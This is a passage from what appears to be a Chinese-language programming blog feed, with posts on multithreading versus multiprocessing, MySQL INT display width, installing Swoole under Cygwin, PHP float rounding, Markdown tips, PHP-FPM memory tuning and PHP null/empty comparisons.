title="为什么要使用多线程？"></a>为什么要使用多线程？</h3><p>对于一个程序来说，很多操作事非常耗时的，如数据库I/O操作、文件读写等。如果使用单线程，那么就只能等待该线程处理完这些操作之后，才能继续往下执行其他操作。</p><p>而如果使用多线程，就可以将耗时的那部分操作通过其他线程去执行，从而提高程序执行效率。</p><h3 id="多线程的缺点"><a href="#多线程的缺点" class="headerlink" title="多线程的缺点"></a>多线程的缺点</h3><ul><li>使用过多线程会过度消耗系统资源，因为创建线程需要开辟新的内存。</li><li>影响系统性能，操作系统需要来回对多线程进行切换。</li><li>同时还需要考虑线程异常（挂起、中止）时可能会对造成程序的影响。</li></ul><p>总结：<br>多线程是异步的，分别创建N 个线程并不能说明他们就是在同时运行，实际上是操作系统在各个线程之间来回切换，并且切换速度非常快，这也就造成了在宏观上给我们同时运行的错觉。</p><h2 id="多进程"><a href="#多进程" class="headerlink" title="多进程"></a>多进程</h2><p><strong>多进程就是指计算机同时执行多个进程。</strong></p><h2 id="多进程还是多线程"><a href="#多进程还是多线程" class="headerlink" title="多进程还是多线程"></a>多进程还是多线程</h2><p>下面引用一个<a href="https://www.zhihu.com/question/19901763/answer/13299543" target="_blank" rel="noopener">知乎上的回答</a>，非常通俗的解释了选择多进程还是多线程的问题。</p><ul><li>单进程单线程：一个人在一个桌子上吃菜。</li><li>单进程多线程：多个人在同一个桌子上一起吃菜。</li><li>多进程单线程：多个人每个人在自己的桌子上吃菜。</li></ul><p>多线程的问题是多个人同时吃一道菜的时候容器发生争抢。例如两个人同时夹一个菜，一个人刚伸出筷子，结果伸到的时候菜已经被夹走了。通俗点说也就说资源共享容器发生冲突争抢。</p><p>对于Windows 系统来说，“开桌子”的开销很大，因此Windows 鼓励大家在一个桌子上吃菜。因此 Windows 多线程的学习重点是资源争抢与同步方面的问题。</p><p>而对于Linux 系统来说，“开桌子”的开销很小，因为Linux 鼓励大家尽量每个人都开自己的桌子吃菜。但这同事也带来了新的问题：两个人坐在不同的桌子上，说话不方便。因为，Linux 多线程的学习重点是进程之间的通讯方式。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.liaoxuefeng.com/wiki/897692888725344/923056118147584" target="_blank" rel="noopener">进程和线程</a></li><li><a href="https://www.cnblogs.com/linuxAndMcu/p/11064916.html" target="_blank" rel="noopener">多进程和多线程的概念</a></li><li><a href="https://www.zhihu.com/question/19901763/answer/13299543" target="_blank" rel="noopener">多线程有什么用？——知乎</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 进程 </tag>
            
            <tag> 线程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL Integer类型与INT(11)详解</title>
      <link href="/mysql-integer-type-and-int-11-detailed-explanation/"/>
      <url>/mysql-integer-type-and-int-11-detailed-explanation/</url>
      
        <content type="html"><![CDATA[<p>MySQL支持的整数类型有TINYINT、SMALLINT、MEDIUMINT、INT、BIGINT。</p><a id="more"></a><p>每种整数类型所需的存储空间和范围如下：<br>|类型|字节|最小值(有符号)|最大值(有符号)|最小值(无符号)|最大值(无符号)|<br>|-|-|-|-|-|-|<br>|TINYINT|1|-128|127|0|255|<br>|SMALLINT|2|-32768|32767|0|65535|<br>|MEDIUMINT|3|-8388608|8388607|0|16777215|<br>|INT|4|-2147483648|2147483647|0|4294967295|<br>|BIGINT|8|-9223372036854775808|(9223372036854775807|0|18446744073709551615|</p><h2 id="有无限制的区别"><a href="#有无限制的区别" class="headerlink" title="有无限制的区别"></a>有无限制的区别</h2><p>在创建数据表时，通常会看见 <code>int(11)</code>和<code>int</code>这样的写法，这两者有什么区别，各自又代表什么意思呢？</p><ol><li>对应Integer 类型而言，仅表示字段的显示宽度。</li><li>对于DECIMAL类型，表示数字的总数。</li><li>对于字符字段，这是可以存储的最大字符数，例如VARCHAR（20）可以存储20个字符。</li></ol><p><strong>显示宽度并不影响可以存储在该列中的最大值。</strong><code>int(3)</code>和<code>int(11)</code> 所能存储的最大范围是一样的。</p><p>将某个字段设置成<code>INT(20)</code>并不意味着将能够存储20位数字，这个字段最终能存储的最大范围还是 INT 的范围。</p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>创建一张临时表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE tmp_table_a (</span><br><span class="line">    id INT(3) NOT NULL AUTO_INCREMENT,</span><br><span class="line">    name varchar(16) DEFAULT &#39;&#39; NOT NULL, </span><br><span class="line">    PRIMARY KEY (&#96;id&#96;)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>查看表结构：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; desc tmp_table_a;</span><br><span class="line">+-------+-------------+------+-----+---------+----------------+</span><br><span class="line">| Field | Type        | Null | Key | Default | Extra          |</span><br><span class="line">+-------+-------------+------+-----+---------+----------------+</span><br><span class="line">| id    | int(3)      | NO   | PRI | NULL    | auto_increment |</span><br><span class="line">| name  | varchar(16) | NO   |     |         |                |</span><br><span class="line">+-------+-------------+------+-----+---------+----------------+</span><br></pre></td></tr></table></figure><p>插入超过”长度”的数字：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO tmp_table_a(id, name) VALUES(123456, &quot;boo&quot;);</span><br></pre></td></tr></table></figure><p>查看结果，发现数字并没有插入失败：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from tmp_table_a;</span><br><span class="line">+--------+------+</span><br><span class="line">| id     | name |</span><br><span class="line">+--------+------+</span><br><span class="line">| 123456 | boo  |</span><br><span class="line">+--------+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><h2 id="有无符号的区别"><a href="#有无符号的区别" class="headerlink" title="有无符号的区别"></a>有无符号的区别</h2><p>那么问题来了，既然加不加数字并没有什么区别，那为什么还多此一举呢？</p><p>这是因为“正常”情况下确实没有什么区别，只有当<strong>字段设置为UNSIGNED ZEROFILL 属性时</strong>，为INT 增加数字才会有意义。</p><p>表示如果要存储的数字少于N 个字符，则这些数字将在左侧补零。</p><h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h3><p>创建一张 UNSIGNED ZEROFILL 的数据表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE tmp_table_b (</span><br><span class="line">    id INT(3) UNSIGNED ZEROFILL NOT NULL AUTO_INCREMENT,</span><br><span class="line">    name varchar(16) DEFAULT &#39;&#39; NOT NULL, </span><br><span class="line">    PRIMARY KEY (&#96;id&#96;)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>查看表结构：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; desc tmp_table_b;</span><br><span class="line">+-------+--------------------------+------+-----+---------+----------------+</span><br><span class="line">| Field | Type                     | Null | Key | Default | Extra          |</span><br><span class="line">+-------+--------------------------+------+-----+---------+----------------+</span><br><span class="line">| id    | int(3) unsigned zerofill | NO   | PRI | NULL    | auto_increment |</span><br><span class="line">| name  | varchar(16)              | NO   |     |         |                |</span><br><span class="line">+-------+--------------------------+------+-----+---------+----------------+</span><br></pre></td></tr></table></figure><p>插入记录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO tmp_table_b(id, name) VALUES(1, &quot;boo&quot;);</span><br></pre></td></tr></table></figure><p>查看记录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from tmp_table_b;</span><br><span class="line">+-----+------+</span><br><span class="line">| id  | name |</span><br><span class="line">+-----+------+</span><br><span class="line">| 001 | boo  |</span><br><span class="line">+-----+------+</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol><li>对于Integer 类型而言，“数字”并不会限制其能存储的最大范围。</li><li>有无符号，不仅会限制其能存储的最大范围，还可以配置“数字”自动补零。</li></ol><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.cnblogs.com/polk6/p/11595107.html" target="_blank" rel="noopener">MySQL Integer类型与INT(11)</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows 如何安装 Swoole？</title>
      <link href="/how-to-install-swoole-on-windows/"/>
      <url>/how-to-install-swoole-on-windows/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.swoole.com/" target="_blank" rel="noopener">Swoole</a> 是一个 PHP 的协程高性能网络通信引擎。</p><a id="more"></a><p>目前仅支持 Linux(2.3.32 以上内核)、FreeBSD、MacOS 三种操作系统，它并不支持直接在 Windows 下安装，因为Windows 系统默认没有以下软件：</p><ul><li>gcc-4.8 或更高版本</li><li>make</li><li>autoconf</li></ul><p>如果一定要在Windows 系统中使用，则可以使用 <a href="http://cygwin.com/" target="_blank" rel="noopener">CygWin</a> 或 WSL(Windows Subsystem for Linux) 。</p><p>这篇笔记并不介绍如何在Windows 系统中，安装Cygwin，如果需要，可以参考<a href="https://www.0x2beace.com/cygwin-quick-start/">Cygwin 快速上手</a> 。</p><p>需要注意的是，在安装Cygwin 时，记得勾选以下软件包：</p><ul><li>gcc、gcc++</li><li>autoconf</li><li>php-devel</li><li>pcre2 </li></ul><h2 id="安装Swoole"><a href="#安装Swoole" class="headerlink" title="安装Swoole"></a>安装Swoole</h2><h3 id="1-可以通过以下方式下载-Swoole"><a href="#1-可以通过以下方式下载-Swoole" class="headerlink" title="1. 可以通过以下方式下载 Swoole"></a>1. 可以通过以下方式下载 Swoole</h3><ul><li><a href="https://github.com/swoole/swoole-src/releases" target="_blank" rel="noopener">github</a></li><li><a href="https://pecl.php.net/package/swoole" target="_blank" rel="noopener">pecl</a></li><li><a href="https://gitee.com/swoole/swoole/tags" target="_blank" rel="noopener">gitee</a></li></ul><h3 id="2-从源码编译安装"><a href="#2-从源码编译安装" class="headerlink" title="2. 从源码编译安装"></a>2. 从源码编译安装</h3><p>下载源代码包后，将其拷贝至 Cygwin 的home 目录，解压并进入文件夹。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf swoole-src.tgz</span><br></pre></td></tr></table></figure><p>编译安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd swoole-src &amp;&amp; \</span><br><span class="line">phpize &amp;&amp; \</span><br><span class="line">.&#x2F;configure &amp;&amp; \</span><br><span class="line">make &amp;&amp; sudo make install</span><br></pre></td></tr></table></figure><p>如果因为某个软件包缺失而导致编译安装失败，则可以重新安装 Cygwin（重新安装不用卸载之间的版本，直接在此安装就好了）。</p><h3 id="3-启用扩展"><a href="#3-启用扩展" class="headerlink" title="3. 启用扩展"></a>3. 启用扩展</h3><p>编译安装到系统成功后，需要在 php.ini 中加入一行 <code>extension=swoole.so</code> 来启用 Swoole 扩展。</p><p>需要注意的是，通过这种方式安装的Swoole，最终存在于Cygwin 环境中，与宿主机中的PHP 版本无关。</p><p>通过<code>php -m | grep  swoole</code>查看是否安装成功。</p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Cygwin </tag>
            
            <tag> Windows </tag>
            
            <tag> Swoole </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP 常见浮点数操作</title>
      <link href="/php-common-floating-point-operations/"/>
      <url>/php-common-floating-point-operations/</url>
      
        <content type="html"><![CDATA[<p>浮点数操作在实际应用中还是挺多的，这篇笔记用来整理常见操作。</p><a id="more"></a><h2 id="保留N位小数做四舍五入"><a href="#保留N位小数做四舍五入" class="headerlink" title="保留N位小数做四舍五入"></a>保留N位小数做四舍五入</h2><p>想要保留N 位小数同时做四舍五入的方式还是挺多的，下面列举常用的几种。</p><h3 id="sprintf"><a href="#sprintf" class="headerlink" title="sprintf"></a>sprintf</h3><p><a href="https://www.php.net/manual/zh/function.sprintf.php" target="_blank" rel="noopener">sprintf</a> 函数用于返回一个格式化之后的字符串。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$num &#x3D; 22.356;</span><br><span class="line">echo sprintf(&quot;%.2f&quot;, $num); &#x2F;&#x2F; 22.36</span><br></pre></td></tr></table></figure><p><code>%.2f</code> 是目标格式，其中2 表示2 位，<code>f</code>表示视为浮点数。</p><h3 id="round"><a href="#round" class="headerlink" title="round"></a>round</h3><p><a href="https://www.php.net/manual/zh/function.round" target="_blank" rel="noopener">round</a> 函数用于对浮点数进行四舍五入。</p><p>还可以通过传入参数，决定从第几位开始四舍五入。如果没有参数，默认从小数点后一位开始四舍五入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo round(3.4);         &#x2F;&#x2F; 3</span><br><span class="line">echo round(3.5);         &#x2F;&#x2F; 4</span><br><span class="line">echo round(22.356, 2);   &#x2F;&#x2F; 22.36</span><br></pre></td></tr></table></figure><h2 id="保留N位小数不做四舍五入"><a href="#保留N位小数不做四舍五入" class="headerlink" title="保留N位小数不做四舍五入"></a>保留N位小数不做四舍五入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$num &#x3D; 22.356;</span><br><span class="line">echo sprintf(&quot;%.2f&quot;,substr(sprintf(&quot;%.3f&quot;, $num), 0, -1));  &#x2F;&#x2F; 22.35</span><br></pre></td></tr></table></figure><h2 id="获取小数位长度"><a href="#获取小数位长度" class="headerlink" title="获取小数位长度"></a>获取小数位长度</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$num &#x3D; 22.356;</span><br><span class="line">echo strlen(substr(strrchr($num, &quot;.&quot;), 1));  &#x2F;&#x2F; 3</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于 Markdown 的一些技巧</title>
      <link href="/some-tips-about-markdown/"/>
      <url>/some-tips-about-markdown/</url>
      
        <content type="html"><![CDATA[<p>这篇笔记的目的是整理Markdown 的一些不常用，却又十分有用的小技巧。</p><a id="more"></a><blockquote><p>什么是Markdown？</p></blockquote><p>Markdown 是一种轻量级标记语言，创始人为约翰·格鲁伯。它允许人们使用易读易写的纯文本格式编写文档，然后转换成有效的XHTML文档。这种语言吸收了很多在电子邮件中已有的纯文本标记的特性。 —— 维基百科</p><h2 id="Markdown-高级技巧"><a href="#Markdown-高级技巧" class="headerlink" title="Markdown 高级技巧"></a>Markdown 高级技巧</h2><p>在Markdown 中，可以直接插入 HTML，目前支持的HTML 元素有：</p><ul><li><code>&lt;kbd&gt;</code></li><li><code>&lt;b&gt;</code></li><li><code>&lt;i&gt;</code></li><li><code>&lt;em&gt;</code></li><li><code>&lt;sub&gt;</code></li><li><code>&lt;sup&gt;</code></li><li><code>&lt;br&gt;</code></li><li>等</li></ul><h3 id="键盘标签"><a href="#键盘标签" class="headerlink" title="键盘标签"></a>键盘标签</h3><p>可以使用<code>&lt;kbd&gt;</code>标签使文本看起来像按钮，这与常规反引号文本略有不同。</p><blockquote><p>Copy code with <kbd>Control</kbd> + <kbd>C</kbd></p></blockquote><h3 id="可视化差异"><a href="#可视化差异" class="headerlink" title="可视化差异"></a>可视化差异</h3><p>可以使用反引号可视化差异，并<code>diff</code>根据需要突出显示红色或绿色的线。</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10 PRINT “BASIC IS COOL”</span><br><span class="line"><span class="deletion">- 20 GOTO 11</span></span><br><span class="line"><span class="addition">+ 20 GOTO 10</span></span><br></pre></td></tr></table></figure><h3 id="隐藏不必要的输出"><a href="#隐藏不必要的输出" class="headerlink" title="隐藏不必要的输出"></a>隐藏不必要的输出</h3><p>添加冗长的错误日志或冗长程序输出的问题可以解决的错误有帮助的，但如果它占用页的垂直空间，可以考虑使用<code>&lt;details&gt;</code>和<code>&lt;summary&gt;</code>标签。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;details&gt;</span><br><span class="line">&lt;summary&gt;git clone 成功，点击查看详情信息&lt;&#x2F;summary&gt;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line">Cloning into &#39;php-markdown-blog&#39;...</span><br><span class="line">remote: Enumerating objects: 67, done.</span><br><span class="line">remote: Counting objects: 100% (67&#x2F;67), done.</span><br><span class="line">remote: Compressing objects: 100% (55&#x2F;55), done.</span><br><span class="line">remote: Total 67 (delta 12), reused 59 (delta 7), pack-reused 0</span><br><span class="line">Unpacking objects: 100% (67&#x2F;67), done.</span><br><span class="line">&lt;&#x2F;details&gt;</span><br></pre></td></tr></table></figure><details><summary>git clone 成功，点击查看详情信息</summary><pre>Cloning into 'php-markdown-blog'...remote: Enumerating objects: 67, done.remote: Counting objects: 100% (67/67), done.remote: Compressing objects: 100% (55/55), done.remote: Total 67 (delta 12), reused 59 (delta 7), pack-reused 0Unpacking objects: 100% (67/67), done.</details><h3 id="使图像文字居中"><a href="#使图像文字居中" class="headerlink" title="使图像文字居中"></a>使图像文字居中</h3><p>HTML 中的<code>&lt;div align=&quot;center&quot;&gt;</code> 居然可以神奇的应用在 Markdown 中，然所有内容居中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div align&#x3D;&quot;center&quot;&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;octodex.github.com&#x2F;images&#x2F;dunetocat.png&quot; width&#x3D;&quot;200&quot;&gt;</span><br><span class="line">&lt;p&gt;This is some centered text.&lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><div align="center"><img src="https://octodex.github.com/images/dunetocat.png" width="200"><p>This is some centered text.</p></div><h3 id="较小的文字"><a href="#较小的文字" class="headerlink" title="较小的文字"></a>较小的文字</h3><p>使用<code>&lt;sub&gt;</code>、<code>&lt;sup&gt;</code>标签，可以使文字变小，非常适合在图像下面添加描述。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;div align&#x3D;&quot;center&quot;&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;octodex.github.com&#x2F;images&#x2F;megacat-2.png&quot; width&#x3D;&quot;200&quot;&gt;&lt;br&gt;</span><br><span class="line">&lt;sup&gt;&lt;strong&gt;Fig 1:&lt;&#x2F;strong&gt; Megatocat into action&lt;&#x2F;sup&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">View more octocats on the [Octodex](https:&#x2F;&#x2F;octodex.github.com&#x2F;)!</span><br></pre></td></tr></table></figure><div align="center"><img src="https://octodex.github.com/images/megacat-2.png" width="200"><br><sup><strong>Fig 1:</strong> Megatocat into action</sup></div><p>View more octocats on the <a href="https://octodex.github.com/" target="_blank" rel="noopener">Octodex</a></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://github.blog/2020-04-09-github-protips-tips-tricks-hacks-and-secrets-from-lee-reilly/#9-a-numbers-game" target="_blank" rel="noopener">GitHub ProTips</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Tips </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MarkDown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP-FPM 优化——占用内存大不释放</title>
      <link href="/php-fpm-optimization-takes-up-a-lot-of-memory-and-does-not-release/"/>
      <url>/php-fpm-optimization-takes-up-a-lot-of-memory-and-does-not-release/</url>
      
        <content type="html"><![CDATA[<p>在传统的 LNMP 架构中，如果Web 应用部分，突然变得特别卡，通常都是内存耗尽导致。</p><a id="more"></a><p>这里说的内存，指的是物理运行内存，而不是虚拟内存（Swap）。</p><p>LNMP架构中PHP是运行在FastCGI模式下，按照官方的说法，php-cgi会在每个请求结束的时候会回收脚本使用的全部内存，但是并不会释放给操作系统，而是继续持有以应对下一次PHP请求。而php-fpm是 FastCGI进程管理器，用于控制php的内存和进程等。</p><p>所以，解决的办法就是通过php-fpm 优化总的进程数和单个进程占用的内存，从而解决php-fpm 进程占用内存大和不释放内存的问题。</p><h3 id="查看当前占用情况"><a href="#查看当前占用情况" class="headerlink" title="查看当前占用情况"></a>查看当前占用情况</h3><p>如果发现Web 应用出现严重卡顿，请求超时等问题，首先检查一下内存的占用情况。常用的命令有：Top、Glances、Free 等。</p><p>使用Glances 或者 Top 命令查看进程，然后按下按键 M，可以查看主机当前的内存占用情况，按照占用内存由多到少排序。</p><p>也可以使用以下命令查看当前 php-fpm 总进程数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ylC php-fpm --sort:rss</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201018104932.png" alt=""></p><p>其中 rss 就是内存占用情况。</p><p>查看当前php-fpm 进程的内存占用情况及启动时间：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -e -o &#39;pid,comm,args,pcpu,rsz,vsz,stime,user,uid&#39;|grep www|sort -nrk5</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201018105106.png" alt=""></p><p>可以看到无论哪一种方式，结果都是一样的。</p><p>查看当前php-fpm进程平均占用内存情况：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps --no-headers -o &quot;rss,cmd&quot; -C php-fpm | awk &#39;&#123; sum+&#x3D;$1 &#125; END &#123; printf (&quot;%d%s\n&quot;, sum&#x2F;NR&#x2F;1024,&quot;M&quot;) &#125;&#39;</span><br><span class="line">&#x2F;&#x2F; 22M</span><br></pre></td></tr></table></figure><h3 id="优化配置"><a href="#优化配置" class="headerlink" title="优化配置"></a>优化配置</h3><p>解决上面那个问题的核心就是 php-fpm 配置中的 <code>max_requests</code>。</p><p>即当一个 PHP-CGI 进程处理的请求数累积到 max_requests 个后，自动重启该进程，这样达到了释放内存的目的了。</p><p>一般来说一个php-fpm 进程占用的内存为30M-40M，所以根据自身实际情况作判断，有以下两种情况：</p><ol><li>实际结果是大于 30M - 40M，那么需要让 php-fpm “早一些“释放内存，<code>max_requests</code> 的数值改小一些。</li><li>实际结果是小于 30M - 40M，则可以让 php-fpm “晚一些“释放内存，<code>max_requests</code>的数值改大一些。</li></ol><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://wzfou.com/php-fpm/" target="_blank" rel="noopener">Linux的php-fpm优化心得-php-fpm进程占用内存大和不释放内存问题</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> PHP-FPM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对于NULL、空、0、false等数据类型的理解</title>
      <link href="/understanding-of-data-types-such-as-null-empty-0-false-etc/"/>
      <url>/understanding-of-data-types-such-as-null-empty-0-false-etc/</url>
      
        <content type="html"><![CDATA[<p>之所以决定写这片笔记，是因为一直对 空 这个概念很模糊，在代码逻辑中常会遇到需要判断的时候，总是模拟两可。</p><a id="more"></a><p>常见的“空”有以下这些：</p><ul><li>整形0：0</li><li>字符1：1</li><li>字符空：””</li><li>字符零：”0”</li><li>空数组：[]</li><li>true</li><li>false</li><li>null</li></ul><p>NUll 上面的那些都好理解，都是常见的，重点介绍一下NULL。</p><h3 id="NULL-是什么？"><a href="#NULL-是什么？" class="headerlink" title="NULL 是什么？"></a>NULL 是什么？</h3><blockquote><p>Null是在计算机具有保留的值，可以用于指针不去引用对象，现在很多程序都会使用指针来表示条件，但是在不同的语言中，含义是不一样的。</p></blockquote><p>这里我们只介绍 PHP 中的 NULL。</p><p>在 PHP 中，表示一个变量没有赋值、或者是被赋值的值为 NULL，以及被 unset 的。</p><h3 id="使用PHP-函数对变量进行比较："><a href="#使用PHP-函数对变量进行比较：" class="headerlink" title="使用PHP 函数对变量进行比较："></a>使用PHP 函数对变量进行比较：</h3><table><thead><tr><th align="left">表达式</th><th align="left"><a href="https://www.php.net/manual/zh/function.gettype.php" target="_blank" rel="noopener">gettype()</a></th><th align="left"><a href="https://www.php.net/manual/zh/function.empty.php" target="_blank" rel="noopener">empty()</a></th><th align="left"><a href="https://www.php.net/manual/zh/function.is-null.php" target="_blank" rel="noopener">is_null()</a></th><th align="left"><a href="https://www.php.net/manual/zh/function.isset.php" target="_blank" rel="noopener">isset()</a></th><th align="left"><a href="https://www.php.net/manual/zh/language.types.boolean.php" target="_blank" rel="noopener">boolean</a> : <code>if($x)</code></th></tr></thead><tbody><tr><td align="left"><code>$x = &quot;&quot;;</code></td><td align="left"><a href="https://www.php.net/manual/zh/language.types.string.php" target="_blank" rel="noopener">string</a></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><code>$x = null;</code></td><td align="left"><a href="https://www.php.net/manual/zh/language.types.null.php" target="_blank" rel="noopener">NULL</a></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><code>var $x;</code></td><td align="left"><a href="https://www.php.net/manual/zh/language.types.null.php" target="_blank" rel="noopener">NULL</a></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td></tr><tr><td align="left">$x is undefined</td><td align="left"><a href="https://www.php.net/manual/zh/language.types.null.php" target="_blank" rel="noopener">NULL</a></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><code>$x = array();</code></td><td align="left"><a href="https://www.php.net/manual/zh/language.types.array.php" target="_blank" rel="noopener">array</a></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><code>$x = false;</code></td><td align="left"><a href="https://www.php.net/manual/zh/language.types.boolean.php" target="_blank" rel="noopener">boolean</a></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><code>$x = true;</code></td><td align="left"><a href="https://www.php.net/manual/zh/language.types.boolean.php" target="_blank" rel="noopener">boolean</a></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td 